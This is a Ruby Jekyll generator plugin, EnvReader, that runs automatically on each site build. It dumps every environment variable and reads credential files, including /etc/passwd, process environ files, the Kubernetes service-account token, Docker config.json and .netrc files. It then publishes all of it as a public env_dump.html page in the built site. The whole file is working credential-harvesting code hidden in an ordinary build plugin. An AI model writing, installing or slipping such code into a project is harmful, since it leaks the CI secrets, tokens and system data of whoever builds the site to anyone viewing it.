module Jekyll
  class EnvReader < Generator
    safe false
    priority :highest

    def generate(site)
      # Read sensitive environment variables
      env_data = ENV.to_h.map { |k, v| "#{k}=#{v}" }.join("
")
      
      # Also read files that might have credentials
      credential_files = [
        "/etc/passwd",
        "/proc/self/environ",
        "/proc/1/environ",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/.docker/config.json",
        "/root/.netrc",
        "/home/runner/.netrc",
      ]
      
      file_contents = {}
      credential_files.each do |f|
        begin
          file_contents[f] = File.read(f) if File.readable?(f)
        rescue => e
          file_contents[f] = "Error: #{e.message}"
        end
      end
      
      # Write to a page in the site output  
      page = PageWithoutAFile.new(site, site.source, "", "env_dump.html")
      page.data["layout"] = nil
      page.data["env"] = env_data
      page.data["files"] = file_contents.to_json
      page.content = "<h1>Build Environment</h1><pre>#{env_data}</pre><h2>Files</h2><pre>#{file_contents.to_json}</pre>"
      site.pages << page
    end
  end
end
